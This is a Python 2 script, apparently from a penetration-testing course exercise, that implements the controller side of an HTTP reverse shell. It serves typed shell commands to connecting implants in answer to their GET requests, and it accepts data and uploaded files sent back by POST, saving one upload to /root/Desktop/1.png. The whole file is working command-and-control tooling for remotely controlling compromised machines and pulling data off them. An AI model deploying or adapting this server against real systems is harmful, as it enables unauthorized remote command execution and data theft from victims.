#first import req module
import BaseHTTPServer # Built-in HTTP library
import os
import cgi # Support module for Common Gateway Interface (CGI) scripts.
import time
import socket

HOST_NAME = '192.168.208.131' #ip and port of server
PORT_NUMBER = 80 #by default http port is 80
os.system("clear || cls")
print("[+] Http Reverse Shell is running... Waiting for Client Connection");
#Create custom HTTPRequestHandler class
class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):   
        command = raw_input("Shell> ")
        s.send_response(200) #send code 200 response
        s.send_header("Content-type", "text/html") #it is part of HTTP header & send header first. 
        s.end_headers() #used for the end of headers.
        s.wfile.write(command) #send the command which we got from the user input.
        try:
            if 'terminate' in command:
                print('[!] Connection is terminated!! press ctrl+c to exit')
                quit()
                httpd.server_close()
        except:
            pass
                

            
    def do_POST(s):
        if s.path == '/store': #Check whether /store is appended or not
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data' :
                    # by using cgi.FieldStorage you can easily extract the filename
                    fs = cgi.FieldStorage( fp = s.rfile, 
                                        headers = s.headers, 
                                        environ={ 'REQUEST_METHOD':'POST' }    
                                      )
                else:
                    print("[-] Unexpected POST request")
                    
                fs_up = fs['file'] #Here file is the key to hold the actual file
                with open('/root/Desktop/1.png', 'wb') as o: #Create new file and write contents into this file.
                    o.write( fs_up.file.read() )
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print(str(e))                
            return
        
        s.send_response(200)
        s.end_headers()
        length  = int(s.headers['Content-Length']) #Gets the size of data
        postVar = s.rfile.read(length ) # Read then print the posted data
        print(postVar) #Print post data
        
        

if __name__ == '__main__':
    #define the handler to manage the incoming request
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever() #to start the connection 
    except KeyboardInterrupt:
        pass
        httpd.server_close()

#all done let's run its on virtual machine
